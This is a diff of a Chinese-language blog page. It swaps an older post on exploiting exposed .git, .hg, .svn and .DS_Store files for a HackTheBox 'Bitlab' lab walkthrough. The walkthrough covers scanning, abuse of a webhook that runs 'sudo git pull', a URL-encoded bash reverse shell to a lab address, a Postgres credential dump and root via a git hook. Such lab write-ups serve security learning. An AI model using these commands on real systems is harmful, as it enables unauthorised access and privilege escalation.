@@ -23,20 +23,31 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x01：.hg源码泄漏">
+  <meta name="description" content="时隔许久，继续">
 <meta property="og:type" content="article">
-<meta property="og:title" content="信息泄露">
-<meta property="og:url" content="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/index.html">
+<meta property="og:title" content="Bitlab-hackthebox">
+<meta property="og:url" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/index.html">
 <meta property="og:site_name" content="be a J0K1R">
-<meta property="og:description" content="0x01：.hg源码泄漏">
+<meta property="og:description" content="时隔许久，继续">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-03-14T03:37:03.000Z">
-<meta property="article:modified_time" content="2020-03-14T13:29:10.000Z">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/11.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/2.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/3.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/5.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/6.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/7.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/8.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/9.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/10.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/12.png">
+<meta property="article:published_time" content="2021-03-03T03:29:16.000Z">
+<meta property="article:modified_time" content="2021-03-03T08:29:53.513Z">
 <meta property="article:author" content="Peguin">
-<meta property="article:tag" content="敏感信息">
+<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/03/03/Bitlab-hackthebox/11.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+<link rel="canonical" href="http://yoursite.com/2021/03/03/Bitlab-hackthebox/">
 
 
 <script id="page-configurations">
@@ -49,7 +60,7 @@
   };
 </script>
 
-  <title>信息泄露 | be a J0K1R</title>
+  <title>Bitlab-hackthebox | be a J0K1R</title>
   
 
 
@@ -189,7 +200,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/03/Bitlab-hackthebox/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/1.jpg">
@@ -202,7 +213,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          信息泄露
+          Bitlab-hackthebox
         </h1>
 
         <div class="post-meta">
@@ -213,7 +224,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-03-14 11:37:03 / Modified: 21:29:10" itemprop="dateCreated datePublished" datetime="2020-03-14T11:37:03+08:00">2020-03-14</time>
+              <time title="Created: 2021-03-03 11:29:16 / Modified: 16:29:53" itemprop="dateCreated datePublished" datetime="2021-03-03T11:29:16+08:00">2021-03-03</time>
             </span>
 
           
@@ -227,52 +238,59 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="0x01：-hg源码泄漏"><a href="#0x01：-hg源码泄漏" class="headerlink" title="0x01：.hg源码泄漏 "></a><strong>0x01：.hg源码泄漏</strong> <a id="more"></a></h4><p>漏洞成因：hg init 的时候会生成.hg</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
+        <p>时隔许久，继续<a id="more"></a></p>
+ <img src="/2021/03/03/Bitlab-hackthebox/11.png" class="">
 
-<p>漏洞利用:dvcs-ripper</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.114</span><br></pre></td></tr></table></figure>
 
-<h4 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02: .git源码泄漏"></a>0x02: .git源码泄漏</h4><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
-<p>漏洞利用:GitHack</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+<h3 id="nmap探端口"><a href="#nmap探端口" class="headerlink" title="nmap探端口"></a>nmap探端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap&#x2F;bitlab 10.10.10.114</span><br></pre></td></tr></table></figure>
 
-<h4 id="0x03-DS-Store文件泄漏"><a href="#0x03-DS-Store文件泄漏" class="headerlink" title="0x03:  .DS_Store文件泄漏"></a>0x03:  .DS_Store文件泄漏</h4><p>漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store,被发现后，获取敏感信息.</p>
-<p>漏洞利用:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Wed Mar  3 10:43:15 2021 as: nmap -v -sC -sV -oA nmap&#x2F;bitlab 10.10.10.114</span><br><span class="line">Nmap scan report for 10.10.10.114</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)</span><br><span class="line">|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)</span><br><span class="line">|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx</span><br><span class="line">|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 55 disallowed entries (15 shown)</span><br><span class="line">| &#x2F; &#x2F;autocomplete&#x2F;users &#x2F;search &#x2F;api &#x2F;admin &#x2F;profile </span><br><span class="line">| &#x2F;dashboard &#x2F;projects&#x2F;new &#x2F;groups&#x2F;new &#x2F;groups&#x2F;*&#x2F;edit &#x2F;users &#x2F;help </span><br><span class="line">|_&#x2F;s&#x2F; &#x2F;snippets&#x2F;new &#x2F;snippets&#x2F;*&#x2F;edit</span><br><span class="line">| http-title: Sign in \xC2\xB7 GitLab</span><br><span class="line">|_Requested resource was http:&#x2F;&#x2F;10.10.10.114&#x2F;users&#x2F;sign_in</span><br><span class="line">|_http-trane-info: Problem with XML parsing of &#x2F;evox&#x2F;about</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Wed Mar  3 10:43:50 2021 -- 1 IP address (1 host up) scanned in 34.29 seconds</span><br></pre></td></tr></table></figure>
 
-<p>工具:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure>
+<p>开放了22和80端口，分别是ssh和web服务，可以直接访问地址，是GitLab的登录界面，存在一个robots.txt界面，访问，有很多目录，但是不知道哪些是有用的，还是用gobuster路径爆破跑</p>
+<h3 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.114  -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-small-words.txt -o gobuster&#x2F;bitlab -s 200,204,301,307,401,403</span><br></pre></td></tr></table></figure>
 
-<h4 id="0x04-网站备份压缩文件"><a href="#0x04-网站备份压缩文件" class="headerlink" title="0x04:网站备份压缩文件"></a>0x04:网站备份压缩文件</h4><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
-<p>漏洞成因：</p>
-<ul>
-<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li>
-<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
-</ul>
-<p>漏洞测试：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure>
+<p>这里因为会返回一个302状态码阻止爆破，就把这个状态码去掉</p>
+<p>这里有发现<code>http://10.10.10.114/help</code>下有一个html界面，查看源码发现有<code>js</code>代码</p>
+<img src="/2021/03/03/Bitlab-hackthebox/2.png" class="">
 
-<h4 id="0x05-SVN文件泄漏"><a href="#0x05-SVN文件泄漏" class="headerlink" title="0x05:SVN文件泄漏"></a>0x05:SVN文件泄漏</h4><p>漏洞利用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
+<p><code>google javascript prettify</code>，<a href="https://beautifiler.io" target="_blank" rel="noopener">代码美化</a>，放入浏览器控制台</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/3.png" class="">
 
-<h4 id="0x06：WEB-INF-web-xml泄漏"><a href="#0x06：WEB-INF-web-xml泄漏" class="headerlink" title="0x06：WEB-INF/web.xml泄漏"></a>0x06：WEB-INF/web.xml泄漏</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
-<p>WEB-INF主要文件或目录：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
+<p>拿到了登录的用户名和密码</p>
+<h3 id="页面信息收集"><a href="#页面信息收集" class="headerlink" title="页面信息收集"></a>页面信息收集</h3><p>登录之后会发现用户拥有两个存储库，其中一个存在<code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$payload  = json_decode($input);</span><br><span class="line">$repo = $payload-&gt;project-&gt;name ?? <span class="string">''</span>;</span><br><span class="line">$event = $payload-&gt;event_type ?? <span class="string">''</span>;</span><br><span class="line">$state = $payload-&gt;object_attributes-&gt;state ?? <span class="string">''</span>;</span><br><span class="line">$branch = $payload-&gt;object_attributes-&gt;target_branch ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($repo==<span class="string">'Profile'</span> &amp;&amp; $branch==<span class="string">'master'</span> &amp;&amp; $event==<span class="string">'merge_request'</span> &amp;&amp; $state==<span class="string">'merged'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec(<span class="string">'cd ../profile/; sudo git pull'</span>),<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"OK\n"</span>;</span><br></pre></td></tr></table></figure>
 
-<p>漏洞利用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</span><br></pre></td></tr></table></figure>
+<p>逻辑很清晰，只要满足if条件那么就会进入配置文件夹执行git pull，自动将分支中的更改合并倒配置文件中，应该存在git pull漏洞，进行尝试</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/5.png" class="">
 
-<p>0x07：CVS泄漏</p>
-<p>漏洞利用:</p>
-<p>取回源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</span><br></pre></td></tr></table></figure>
+<p>shell成功上传，并且能够执行命令</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash+-c++'bash+-i+&gt;%26+/dev/tcp/10.10.14.38/9001+0&gt;%261'</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;查看所有的改变的命令，转到download的目录</span><br></pre></td></tr></table></figure>
+<p>进行url编码之后，可以弹回shell</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/6.png" class="">
 
-<p>工具：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>
+<p>查看sudo的权限</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/7.png" class="">
 
+<p>在<code>/home/clave</code>下发现了user.txt，但是权限太低了</p>
+<p>前面网页有一个文件有关数据库</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/8.png" class="">
+
+<h3 id="User权限"><a href="#User权限" class="headerlink" title="User权限"></a>User权限</h3><p>Postgresql获取信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line">$result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br><span class="line">print_r(pg_fetch_all($result));</span><br></pre></td></tr></table></figure>
+
+<p>本地用python起一个web环境，在反弹的shell里用wget下载</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/9.png" class="">
+
+<p>接着直接su切换用户，user.txt到手</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/10.png" class="">
+
+<h3 id="Root权限"><a href="#Root权限" class="headerlink" title="Root权限"></a>Root权限</h3><p>和反弹shell差不多，<a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks" target="_blank" rel="noopener">git pull漏洞</a></p>
+<p>靶机里复制一份profile下的所有文件，写一个反弹shell，同样的方法下载到靶机里的<code>profile/.git/hooks</code>路径下，网页再次创建新文件，然后利用<code>sudo git pull</code>获得root权限</p>
+ <img src="/2021/03/03/Bitlab-hackthebox/12.png" class="">
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习到了git pull漏洞</p>
 
     </div>
 
@@ -308,7 +326,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">http://yoursite.com/2020/03/14/信息泄露/</a>
+    <a href="http://yoursite.com/2021/03/03/Bitlab-hackthebox/" title="Bitlab-hackthebox">http://yoursite.com/2021/03/03/Bitlab-hackthebox/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -348,7 +366,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/" rel="tag"># 敏感信息</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
           </div>
 
         
@@ -357,12 +375,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/03/11/%E6%94%BB%E9%98%B2daliy/" rel="prev" title="攻防daliy">
-      <i class="fa fa-chevron-left"></i> 攻防daliy
+    <a href="/2021/02/15/doctor-hackthebox/" rel="prev" title="doctor-hackthebox">
+      <i class="fa fa-chevron-left"></i> doctor-hackthebox
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/03/29/BJD2MRCTF/" rel="next" title="BJD2MRCTF">
-      BJD2MRCTF <i class="fa fa-chevron-right"></i>
+    <a href="/2021/03/05/Craft-hackthebox/" rel="next" title="Craft-hackthebox">
+      Craft-hackthebox <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -431,7 +449,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01：-hg源码泄漏"><span class="nav-number">1.</span> <span class="nav-text">0x01：.hg源码泄漏 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-git源码泄漏"><span class="nav-number">2.</span> <span class="nav-text">0x02: .git源码泄漏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-DS-Store文件泄漏"><span class="nav-number">3.</span> <span class="nav-text">0x03:  .DS_Store文件泄漏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-网站备份压缩文件"><span class="nav-number">4.</span> <span class="nav-text">0x04:网站备份压缩文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-SVN文件泄漏"><span class="nav-number">5.</span> <span class="nav-text">0x05:SVN文件泄漏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06：WEB-INF-web-xml泄漏"><span class="nav-number">6.</span> <span class="nav-text">0x06：WEB-INF&#x2F;web.xml泄漏</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap探端口"><span class="nav-number">1.</span> <span class="nav-text">nmap探端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gobuster目录爆破"><span class="nav-number">2.</span> <span class="nav-text">gobuster目录爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#页面信息收集"><span class="nav-number">3.</span> <span class="nav-text">页面信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">4.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User权限"><span class="nav-number">5.</span> <span class="nav-text">User权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Root权限"><span class="nav-number">6.</span> <span class="nav-text">Root权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -447,7 +465,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">87</span>
+          <span class="site-state-item-count">91</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
